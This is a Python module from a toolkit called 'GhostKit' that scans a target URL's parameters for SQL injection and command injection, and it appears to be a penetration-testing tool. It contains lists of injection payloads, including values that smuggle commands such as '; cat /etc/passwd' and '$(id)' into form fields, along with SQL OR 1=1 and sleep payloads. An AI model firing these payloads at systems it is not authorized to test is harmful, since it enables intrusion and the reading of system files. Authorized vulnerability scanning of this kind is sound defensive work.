#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Injection Scanner Module for GhostKit
Specializes in detecting SQL injection and command injection vulnerabilities
"""

import argparse
import json
import logging
import os
import random
import re
import sys
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple, Union

# Import from web_core module
try:
    from modules.web_core import Module as WebCoreModule
    from modules.web_core import WebScanner, WebTarget
except ImportError:
    logging.error("web_core module not found. This module requires web_core.py")
    WebTarget = None
    WebScanner = None
    WebCoreModule = None

from modules.base_module import BaseModule


class SQLiScanner(WebScanner):
    """SQL Injection vulnerability scanner"""

    def __init__(self, target: WebTarget):
        super().__init__(target)

        # SQL injection payloads by detection type
        self.error_payloads = [
            "' OR 1=1 --",
            '" OR 1=1 --',
            "' OR '1'='1",
            '" OR "1"="1',
            "') OR ('1'='1",
            '") OR ("1"="1',
            "' OR 1=1#",
            "admin' --",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' UNION SELECT NULL--+",
            "1' UNION SELECT NULL,NULL--+",
            "' OR '1'='1' --",
            "' OR 1=1 LIMIT 1 --",
        ]

        self.time_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            '" AND (SELECT * FROM (SELECT(SLEEP(3)))a) --',
            "' AND SLEEP(3) --",
            '" AND SLEEP(3) --',
            "' AND pg_sleep(3) --",
            '" AND pg_sleep(3) --',
            "' WAITFOR DELAY '0:0:3' --",
            "\" WAITFOR DELAY '0:0:3' --",
        ]

        self.boolean_payloads = [
            "' AND 1=1 --",
            "' AND 1=2 --",
            '" AND 1=1 --',
            '" AND 1=2 --',
            "' OR 1=1 --",
            "' OR 1=2 --",
            '" OR 1=1 --',
            '" OR 1=2 --',
        ]

        # Error patterns that indicate SQL injection vulnerability
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQL Query fail.*",
            r"mysqli_fetch_array\(\)",
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            # Microsoft SQL Server
            r"Microsoft SQL Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Warning.*oci_",
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            # Generic
            r"SQL syntax.*",
            r"Error.*SQL",
            r"SQL Error",
            r"SqlException",
            r"Unclosed quotation mark after the character string",
            r"You have an error in your SQL syntax",
            r"Incorrect syntax near",
        ]

    def scan(self, crawled_data: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Scan for SQL injection vulnerabilities"""
        print("\n[*] Starting SQL Injection scan...")

        # Clear previous findings
        self.findings = []

        # If we have crawled data, use it to extract parameters
        parameters_to_test = set()

        if crawled_data and "parameters" in crawled_data:
            parameters_to_test.update(crawled_data["parameters"])

        if crawled_data and "forms" in crawled_data:
            for form_id, form_data in crawled_data["forms"].items():
                for input_data in form_data.get("inputs", []):
                    if "name" in input_data:
                        parameters_to_test.add(input_data["name"])

        # If no parameters found, test some common ones
        if not parameters_to_test:
            parameters_to_test = {
                "id",
                "user",
                "username",
                "password",
                "query",
                "q",
                "search",
                "keyword",
                "email",
            }

        print(f"[*] Testing {len(parameters_to_test)} parameters for SQL injection")

        # Test parameters with error-based detection
        for param in parameters_to_test:
            print(f"[*] Testing parameter: {param}")
            self._test_error_based(param)
            self._test_time_based(param)
            self._test_boolean_based(param)

        if self.findings:
            print(f"[!] Found {len(self.findings)} SQL injection vulnerabilities")
        else:
            print("[*] No SQL injection vulnerabilities found")

        return self.findings

    def _test_error_based(self, parameter: str) -> None:
        """Test for error-based SQL injection"""
        base_url = self.target.base_url

        # Get baseline response without injection
        params = {parameter: "test123"}
        baseline = self.target.get(params=params)

        if not baseline:
            return

        # Test each payload
        for payload in self.error_payloads:
            params = {parameter: payload}
            response = self.target.get(params=params)

            if not response:
                continue

            # Check for error patterns
            for pattern in self.error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    url_with_payload = (
                        f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                    )
                    self.add_finding(
                        vulnerability_type="sql_injection",
                        url=url_with_payload,
                        parameter=parameter,
                        evidence=f"SQL error detected with payload: {payload}",
                        severity="high",
                        confidence="high",
                        description="Error-based SQL injection vulnerability detected. This could allow an attacker to extract data from the database or potentially execute code on the database server.",
                    )
                    return  # Stop after first confirmed vulnerability for this parameter

    def _test_time_based(self, parameter: str) -> None:
        """Test for time-based SQL injection"""
        base_url = self.target.base_url

        # Get baseline response time
        params = {parameter: "test123"}
        start_time = time.time()
        self.target.get(params=params)
        baseline_time = time.time() - start_time

        # Test each time-based payload
        for payload in self.time_payloads:
            params = {parameter: payload}
            start_time = time.time()
            self.target.get(params=params)
            response_time = time.time() - start_time

            # If response time is significantly longer than baseline, likely vulnerable
            if response_time > (
                baseline_time + 2.5
            ):  # Look for delay of at least 2.5 seconds
                url_with_payload = (
                    f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                )
                self.add_finding(
                    vulnerability_type="sql_injection",
                    url=url_with_payload,
                    parameter=parameter,
                    evidence=f"Time-based SQL injection detected. Baseline: {baseline_time:.2f}s, With payload: {response_time:.2f}s",
                    severity="high",
                    confidence="medium",
                    description="Time-based SQL injection vulnerability detected. This could allow an attacker to extract data from the database through timing attacks, even when the application does not display error messages.",
                )
                return  # Stop after first confirmed vulnerability for this parameter

    def _test_boolean_based(self, parameter: str) -> None:
        """Test for boolean-based SQL injection"""
        base_url = self.target.base_url

        # We need pairs of TRUE/FALSE conditions to compare responses
        for i in range(0, len(self.boolean_payloads), 2):
            if i + 1 >= len(self.boolean_payloads):
                break

            true_payload = self.boolean_payloads[i]  # Should evaluate to TRUE
            false_payload = self.boolean_payloads[i + 1]  # Should evaluate to FALSE

            params_true = {parameter: true_payload}
            params_false = {parameter: false_payload}

            response_true = self.target.get(params=params_true)
            response_false = self.target.get(params=params_false)

            if not response_true or not response_false:
                continue

            # Compare responses - significant difference in content length may indicate boolean-based SQLi
            if abs(len(response_true.content) - len(response_false.content)) > 10:
                url_with_payload = (
                    f"{base_url}?{parameter}={urllib.parse.quote(true_payload)}"
                )
                self.add_finding(
                    vulnerability_type="sql_injection",
                    url=url_with_payload,
                    parameter=parameter,
                    evidence=f"Boolean-based SQLi detected. TRUE payload returned {len(response_true.content)} bytes, FALSE payload returned {len(response_false.content)} bytes",
                    severity="high",
                    confidence="medium",
                    description="Boolean-based SQL injection vulnerability detected. This could allow an attacker to extract data from the database through differential analysis of responses.",
                )
                return  # Stop after first confirmed vulnerability for this parameter


class CommandInjectionScanner(WebScanner):
    """Command Injection vulnerability scanner"""

    def __init__(self, target: WebTarget):
        super().__init__(target)

        # Command injection payloads by OS
        self.unix_payloads = [
            "; id",
            "& id",
            "| id",
            "; ls -la",
            "& ls -la",
            "| ls -la",
            "; cat /etc/passwd",
            "$(id)",
            "`id`",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "; sleep 5",
            "& sleep 5",
            "| sleep 5",
        ]

        self.windows_payloads = [
            "; dir",
            "& dir",
            "| dir",
            "; whoami",
            "& whoami",
            "| whoami",
            "; ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "; timeout 5",
            "& timeout 5",
            "| timeout 5",
        ]

        # Combined payloads that work on both OSes
        self.generic_payloads = [
            "; echo InjectTest",
            "& echo InjectTest",
            "| echo InjectTest",
            "|| echo InjectTest",
            "&&echo InjectTest",
            "; ping -c 3 127.0.0.1",
            "& ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
        ]

        # Evidence patterns
        self.unix_patterns = [
            r"uid=\d+\(.*\) gid=\d+\(.*\)",  # id command output
            r"total \d+",  # ls -la output
            r"root:.*:0:0:",  # /etc/passwd content
            r"bin:.*:/bin",  # /etc/passwd content
            r"daemon:.*:/usr/sbin",  # /etc/passwd content
        ]

        self.windows_patterns = [
            r"Volume in drive [A-Z] is",  # dir output
            r"Directory of",  # dir output
            r"File\(s\)",  # dir output
            r"DIR\(s\)",  # dir output
            r"[A-Z]:\\[A-Za-z0-9\\]+",  # Windows path
        ]

        self.generic_patterns = [
            r"InjectTest",  # echo output
            r"bytes of data",  # ping output
            r"icmp_seq=",  # ping output
            r"TTL=",  # ping output (Windows)
            r"time=",  # ping output
            r"statistics",  # ping output
            r"packets transmitted",  # ping output
            r"received",  # ping output
            r"packet loss",  # ping output
            r"min/avg/max",  # ping output
            r"ms",  # ping output
        ]

    def scan(self, crawled_data: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Scan for command injection vulnerabilities"""
        print("\n[*] Starting Command Injection scan...")

        # Clear previous findings
        self.findings = []

        # If we have crawled data, use it to extract parameters
        parameters_to_test = set()

        if crawled_data and "parameters" in crawled_data:
            parameters_to_test.update(crawled_data["parameters"])

        if crawled_data and "forms" in crawled_data:
            for form_id, form_data in crawled_data["forms"].items():
                for input_data in form_data.get("inputs", []):
                    if "name" in input_data:
                        parameters_to_test.add(input_data["name"])

        # If no parameters found, test some common ones
        if not parameters_to_test:
            parameters_to_test = {
                "cmd",
                "command",
                "exec",
                "query",
                "q",
                "run",
                "execute",
                "ping",
                "host",
                "ip",
            }

        print(f"[*] Testing {len(parameters_to_test)} parameters for command injection")

        # Test parameters
        for param in parameters_to_test:
            print(f"[*] Testing parameter: {param}")
            self._test_parameter(param)

        if self.findings:
            print(f"[!] Found {len(self.findings)} command injection vulnerabilities")
        else:
            print("[*] No command injection vulnerabilities found")

        return self.findings

    def _test_parameter(self, parameter: str) -> None:
        """Test a parameter for command injection vulnerabilities"""
        base_url = self.target.base_url

        # Get baseline response
        params = {parameter: "test123"}
        baseline = self.target.get(params=params)

        if not baseline:
            return

        # Test payloads - start with generic ones
        for payload in self.generic_payloads:
            params = {parameter: payload}
            response = self.target.get(params=params)

            if not response:
                continue

            # Check for evidence patterns
            for pattern in self.generic_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    url_with_payload = (
                        f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                    )
                    self.add_finding(
                        vulnerability_type="command_injection",
                        url=url_with_payload,
                        parameter=parameter,
                        evidence=f"Command output detected with payload: {payload}",
                        severity="critical",
                        confidence="high",
                        description="Command injection vulnerability detected. This allows an attacker to execute arbitrary commands on the host operating system.",
                    )
                    return  # Stop after first confirmed vulnerability for this parameter

        # Try OS-specific payloads
        # UNIX first
        for payload in self.unix_payloads:
            params = {parameter: payload}
            response = self.target.get(params=params)

            if not response:
                continue

            for pattern in self.unix_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    url_with_payload = (
                        f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                    )
                    self.add_finding(
                        vulnerability_type="command_injection",
                        url=url_with_payload,
                        parameter=parameter,
                        evidence=f"UNIX command output detected with payload: {payload}",
                        severity="critical",
                        confidence="high",
                        description="Command injection vulnerability detected on a UNIX-like system. This allows an attacker to execute arbitrary commands on the host operating system.",
                    )
                    return  # Stop after first confirmed vulnerability for this parameter

        # Windows
        for payload in self.windows_payloads:
            params = {parameter: payload}
            response = self.target.get(params=params)

            if not response:
                continue

            for pattern in self.windows_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    url_with_payload = (
                        f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                    )
                    self.add_finding(
                        vulnerability_type="command_injection",
                        url=url_with_payload,
                        parameter=parameter,
                        evidence=f"Windows command output detected with payload: {payload}",
                        severity="critical",
                        confidence="high",
                        description="Command injection vulnerability detected on a Windows system. This allows an attacker to execute arbitrary commands on the host operating system.",
                    )
                    return  # Stop after first confirmed vulnerability for this parameter

        # Try time-based detection as a last resort
        time_payloads = [
            "; sleep 5",
            "& sleep 5",
            "| sleep 5",
            "; ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "; ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ]

        # Get baseline response time
        start_time = time.time()
        self.target.get(params={parameter: "test123"})
        baseline_time = time.time() - start_time

        for payload in time_payloads:
            params = {parameter: payload}
            start_time = time.time()
            self.target.get(params=params)
            response_time = time.time() - start_time

            if response_time > (
                baseline_time + 4.5
            ):  # Look for delay of at least 4.5 seconds
                url_with_payload = (
                    f"{base_url}?{parameter}={urllib.parse.quote(payload)}"
                )
                self.add_finding(
                    vulnerability_type="command_injection",
                    url=url_with_payload,
                    parameter=parameter,
                    evidence=f"Time-based command injection detected. Baseline: {baseline_time:.2f}s, With payload: {response_time:.2f}s",
                    severity="critical",
                    confidence="medium",
                    description="Time-based command injection vulnerability detected. This allows an attacker to execute arbitrary commands on the host operating system.",
                )
                return  # Stop after first confirmed vulnerability for this parameter


class Module(BaseModule):
    """Web Injection Scanner Module for GhostKit"""

    def __init__(self):
        super().__init__()
        self.description = (
            "Web injection vulnerability scanner for SQL and command injection"
        )
        self.args_parser = self._create_arg_parser()

    def _create_arg_parser(self) -> argparse.ArgumentParser:
        """Create argument parser for the web injection scanner module"""
        parser = argparse.ArgumentParser(description=self.description)
        parser.add_argument("-u", "--url", required=True, help="Target URL")
        parser.add_argument(
            "-t",
            "--type",
            choices=["sqli", "cmdi", "all"],
            default="all",
            help="Type of injection to scan for",
        )
        parser.add_argument(
            "-c",
            "--cookies",
            help="Cookies to use in requests (format: name1=value1;name2=value2)",
        )
        parser.add_argument(
            "-H", "--headers", help="Custom headers (format: name1=value1;name2=value2)"
        )
        parser.add_argument(
            "-p", "--proxy", help="Proxy to use (format: http://host:port)"
        )
        parser.add_argument(
            "--timeout", type=int, default=10, help="Request timeout in seconds"
        )
        parser.add_argument(
            "--no-verify-ssl", action="store_true", help="Disable SSL verification"
        )
        parser.add_argument(
            "--crawl",
            action="store_true",
            help="Crawl the target first to discover parameters",
        )
        parser.add_argument(
            "--crawl-depth", type=int, default=2, help="Maximum crawl depth"
        )
        parser.add_argument("-o", "--output", help="Output file for results")
        return parser

    def _parse_keyval_string(self, keyval_string: str) -> Dict[str, str]:
        """Parse key=value;key2=value2 strings into dict"""
        if not keyval_string:
            return {}

        result = {}
        pairs = keyval_string.split(";")
        for pair in pairs:
            if "=" in pair:
                key, value = pair.split("=", 1)
                result[key.strip()] = value.strip()

        return result

    def run(self, args: List[str]) -> Dict[str, Any]:
        """Run the web injection scanner module with the given arguments"""
        if not WebTarget:
            self.logger.error(
                "web_core module not found. This module requires web_core.py"
            )
            return {"status": "error", "message": "web_core module not found"}

        parsed_args = self.args_parser.parse_args(args)

        # Initialize target
        cookies = self._parse_keyval_string(parsed_args.cookies)
        headers = self._parse_keyval_string(parsed_args.headers)

        target = WebTarget(
            url=parsed_args.url,
            headers=headers,
            cookies=cookies,
            proxy=parsed_args.proxy,
            timeout=parsed_args.timeout,
            verify_ssl=not parsed_args.no_verify_ssl,
        )

        # Initialize scanners
        sqli_scanner = SQLiScanner(target)
        cmdi_scanner = CommandInjectionScanner(target)

        crawled_data = None

        # Crawl if requested
        if parsed_args.crawl:
            if not WebCoreModule:
                self.logger.warning(
                    "web_core module not properly imported, crawling disabled"
                )
            else:
                print(f"[*] Crawling {parsed_args.url} to discover parameters...")
                web_core = WebCoreModule()
                web_core_args = [
                    "--url",
                    parsed_args.url,
                    "--action",
                    "crawl",
                    "--depth",
                    str(parsed_args.crawl_depth),
                ]

                if parsed_args.cookies:
                    web_core_args.extend(["--cookies", parsed_args.cookies])
                if parsed_args.headers:
                    web_core_args.extend(["--headers", parsed_args.headers])
                if parsed_args.proxy:
                    web_core_args.extend(["--proxy", parsed_args.proxy])
                if parsed_args.no_verify_ssl:
                    web_core_args.append("--no-verify-ssl")

                crawl_result = web_core.run(web_core_args)
                if (
                    crawl_result.get("status") == "success"
                    and "crawl_data" in crawl_result
                ):
                    crawled_data = crawl_result["crawl_data"]
                    print(
                        f"[*] Crawl completed, discovered {len(crawled_data.get('parameters', []))} parameters"
                    )

        # Run scans
        findings = []

        if parsed_args.type in ["sqli", "all"]:
            print("\n[*] Running SQL injection scan...")
            sqli_findings = sqli_scanner.scan(crawled_data)
            findings.extend(sqli_findings)

        if parsed_args.type in ["cmdi", "all"]:
            print("\n[*] Running command injection scan...")
            cmdi_findings = cmdi_scanner.scan(crawled_data)
            findings.extend(cmdi_findings)

        # Prepare results
        results = {
            "status": "success",
            "target": parsed_args.url,
            "scan_type": parsed_args.type,
            "total_findings": len(findings),
            "findings": findings,
        }

        # Print summary
        print("\n" + "=" * 60)
        print(f"SCAN SUMMARY: {parsed_args.url}")
        print("=" * 60)

        if findings:
            print(f"Total vulnerabilities found: {len(findings)}")

            vuln_types = {}
            severity_counts = {
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0,
                "info": 0,
            }

            for finding in findings:
                vuln_type = finding.get("type", "unknown")
                severity = finding.get("severity", "info")

                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                severity_counts[severity] = severity_counts.get(severity, 0) + 1

            print("\nVulnerability Types:")
            for vuln_type, count in vuln_types.items():
                print(f"  {vuln_type}: {count}")

            print("\nSeverity Distribution:")
            for severity, count in severity_counts.items():
                if count > 0:
                    print(f"  {severity.upper()}: {count}")

            print("\nTop Findings:")
            for i, finding in enumerate(findings[:5], 1):
                print(
                    f"  {i}. {finding['type']} in {finding['parameter']} - {finding['severity'].upper()}"
                )
                print(f"     URL: {finding['url']}")
        else:
            print("No vulnerabilities found")

        print("=" * 60)

        # Save results if requested
        if parsed_args.output:
            try:
                with open(parsed_args.output, "w") as f:
                    json.dump(results, f, indent=4)
                self.logger.info(f"Results saved to {parsed_args.output}")
                print(f"[*] Results saved to {parsed_args.output}")
            except Exception as e:
                self.logger.error(f"Error saving results: {str(e)}")

        return results


# If run directly, show help
if __name__ == "__main__":
    module = Module()
    print(module.get_help())
